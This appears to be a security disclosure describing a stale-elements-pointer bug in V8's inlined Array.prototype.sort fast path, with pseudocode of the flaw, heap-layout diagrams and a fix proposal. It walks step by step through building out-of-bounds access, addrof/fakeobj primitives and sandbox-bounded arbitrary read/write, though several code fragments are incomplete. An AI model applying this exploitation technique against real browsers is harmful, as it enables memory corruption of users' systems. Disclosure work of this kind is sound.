Summary
OpenAI Codex Security identified a vulnerability in the recently introduced Array.prototype.sort inlined fast path. The new inlined path caches the receiver's elements pointer before invoking a user controlled callback. After the callback execution, the path fails to validate if the elements pointer has changed.

During the user callback, the array object can be manipulated such that the map and the length of the array remains unchanged, but the elements pointer has changed to a new location. This causes future writes to the array to be written out of bounds.

This out-of-bounds write allows for corruption of the V8 heap sandbox. As a proof-of-concept, we use this out-of-bounds write to construct addrOf, fakeObj, and a heap-sandbox constrained arbitrary read/write. This is effectively full memory access within the confines of the v8 heap-sandbox.

Impact
This issue enables attacker-controlled JavaScript to corrupt heap state resulting in full memory access to the V8 heap-sandbox.

Analysis of Use of Stale Elements Pointer
The vulnerability was introduced in the recent commit https://github.com/v8/v8/commit/8f872b64baeab125e1a69031aefb46032f5e970b

The new compiler fast path inlines a tiny insertion sort for packed arrays with length at most JSArray::kMaxInlineSortLength, currently 16. The compiler wants to model spec snapshot semantics, so it copies the receiver's elements into a temporary FixedArray, sorts the temporary array, then copies the sorted values back into the receiver.

The vulnerable TurboFan shape is effectively:

original_length = receiver.length;
elements = receiver.elements;              // cached before callbacks

for (k = 0; k < original_length; k++) {
  temp[k] = elements[k];
}

// User-controlled comparator calls happen here.
insertion_sort(temp, comparefn);

CheckMaps(receiver);
Check(receiver.length == original_length); // map + length only

for (k = 0; k < original_length; k++) {
  elements[k] = temp[k];                   // stale pointer sink
}
The bug is the missing post-comparator invariant:

Check(receiver.elements == elements);
or equivalently, the missing reload of the current backing store before copy-back. A JavaScript comparator can mutate the receiver while preserving map and length. If it changes the elements pointer, the final copy-back writes through stale memory.

Object Layout Cheat Sheet
All diagrams below use pointer-compressed tagged fields. A tagged field is 4 bytes. Object pointers shown as E, A, or T are conceptual heap object starts in the compressed cage.

A JSArray object is 16 bytes:

The specific proof-of-concept exploit provided in this report depends on the fact that FixedArray element slot 0 is at E + 0x08, while left-trimming by one tagged slot moves the new object start to E + 0x04. Therefore:

old FixedArray element[0] address = old_E + 0x08--> AFTER CALLBACK
new FixedArray length address     = (old_E + 0x04) + 0x04
                              == old_E + 0x08So writting to old element[0] overwrites new FixedArray length

Exploiting FixedArray Corruption
Now that the FixedArray has a corrupted length field, we will attempt to form useful exploit primitives with it.

Step 1: Turn Corrupted Length into Array OOB
This is fairly straightforward as the fast array length setter treats FixedArray::length as backing capacity. Since the header now says the backing has about 1001 slots, this assignment does not grow the backing store: oob.length = 900;

The result is a JSArray whose visible length is 900 but whose physical backing allocation is still the right-trimmed 16-slot object.

State after length setter:

oob JSArray @ O
+0x08  elements   E_new
+0x0c  length     Smi(900)

FixedArray @ E_new
+0x00  map        fixed_array_map
+0x04  length     Smi(1001)       // forged capacity
+0x08  slot[0]    real in-object slot
...
+0x44  slot[15]   real in-object slot
+0x48  slot[16]   adjacent heap memory, now JS-visible as oob[16]
+0x4c  slot[17]   adjacent heap memory
...
This gives us an easy to use out-of-bound read/write of PACKED_ELEMENTS kind.

To use this we can construct a deterministic young-generation layout where the OOB slots overlap a neighboring target JSArray object:

oob[579] -> PACKED_ELEMENTS JSArray Map object
oob[580] -> empty FixedArray properties object
oob[591] -> target.elements field
oob[592] -> target.length field

Step 3: Building addrof and fakeobj with Classic Pointer/Double Confusion
objarr is a PACKED_ELEMENTS array, so its backing store contains compressed tagged pointers. dblarr is a PACKED_DOUBLE_ELEMENTS array, so its backing store is interpreted as raw float64 values.

If we point dblarr.elements at objarr's FixedArray, reading dblarr[0] interprets two adjacent compressed tagged slots as one 64-bit double payload.

Before confusion:

objElements FixedArray @ A
+0x00  map
+0x04  length
+0x08  objarr[0] = tagged obj0
+0x0c  objarr[1] = tagged obj1
+0x10  objarr[2] = Smi(0x3333)
+0x14  objarr[3] = Smi(0x4444)

dblarr.elements -> D, a real FixedDoubleArray

Confused state:

dblarr.elements -> A

dblarr[0] reads 8 bytes at A + 0x08:

low32  = tagged objarr[0]
high32 = tagged objarr[1]
The primitive:

function addrof(o) {
  writeElements(dblarr, objElements);

  objarr[1] = obj1;

This returns the low 32-bit compressed tagged pointer for o.

For fakeobj, we reverse the confusion. We point an object array at double data, place a compressed pointer in the first 32-bit lane of dblarr[0], and read it back as objarr[0].

  writeElements(objarr, dblElements);
  dblarr[0] = itof((obj1AddrForFake << 32n) | (addr32 & 0xffffffffn));
  const o = objarr[0];

const fake = fakeobj(fakeAddr);
The fake object itself is built inside dblarr's FixedDoubleArray data. The first double slot is reserved for materializing the fake pointer, so the fake object starts at dblElements + 16, which is dblarr[1].

After this, fake is a JavaScript reference to a forged JSArray object whose fields are controlled by dblarr[1] and dblarr[2].

Step 4: Arbitrary Read/Write
A PACKED_ELEMENTS JSArray element access computes:

address = fake.elements + FixedArray::kHeaderSize + index * kTaggedSize
To read or write a tagged slot at compressed address X, set:

fake.elements = X - 0x08
fake.length   = 4
Then fake[0] aliases the tagged slot at X.

Suggested Fix Direction
The optimized sort reducers need a post-callback elements invariant. A map/length check is insufficient.

Conservative hardening:

After all comparator calls and before any copy-back store, reload current_elements = LoadElements(receiver).
Deopt if current_elements != cached_elements.
Alternative:

Reload current elements after callbacks.
Ensure capacity and elements-kind invariants still hold before writing.
The first option is likely smaller and safer for an optimized fast path: deopt on elements-pointer changes
